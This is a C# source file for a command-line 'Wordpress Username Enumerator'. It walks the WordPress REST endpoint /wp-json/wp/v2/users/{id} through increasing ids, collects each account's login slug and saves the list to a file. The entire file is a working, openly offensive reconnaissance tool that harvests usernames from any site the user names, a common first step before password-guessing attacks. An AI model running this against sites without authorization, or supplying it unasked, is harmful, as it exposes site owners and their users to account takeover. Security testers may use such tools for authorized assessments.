using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text.Json;
using System.Threading;
using System.Threading.Channels;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace WP_User_Enumeration
{
    class Program
    {
        static void Main(string[] args)
        {
            Uri url;
            string path, urlString;
            int maxFails, failsCounter = 0, idCounter = 1;
            var resultList = new List<string>();

            Console.WriteLine("\n|==========| Wordpress Username Enumerator |==========|\n");

            Console.Write("Target URL: ");
            urlString = Console.ReadLine();

            if (urlString[..4] != "http")
                urlString = "http://" + urlString;

            url = new Uri(urlString);

            Console.Write("Max fails in a row: ");
            maxFails = Convert.ToInt16(Console.ReadLine());

            Console.Write("Output path: ");
            path = Console.ReadLine();


            Console.WriteLine("\n[+] Enumerating all users...");

            using (var client = new WebClient())
            {
                for (;;)
                {
                    if (failsCounter > maxFails) break;

                    try
                    {
                        var response = client.DownloadString(new Uri(url, @$"/wp-json/wp/v2/users/{idCounter}"));
                        var jobject = (JObject)JsonConvert.DeserializeObject(response);
                        var uname = jobject["slug"].Value<string>();
                        resultList.Add(uname);
                        Console.WriteLine($"[!] Found username \"{uname}\" with id {idCounter}");
                        idCounter++;
                        failsCounter = 0;
                    }

                    catch (Exception e)
                    {
                        Console.WriteLine($"[i] {e.Message}");
                        failsCounter++;
                        idCounter++;
                    }

                    Thread.Sleep(10);
                }
            }

            File.WriteAllLines(path, resultList);
            Console.WriteLine($"\r\n[!] Complete! Found {resultList.Count} usernames");
        }
    }
}
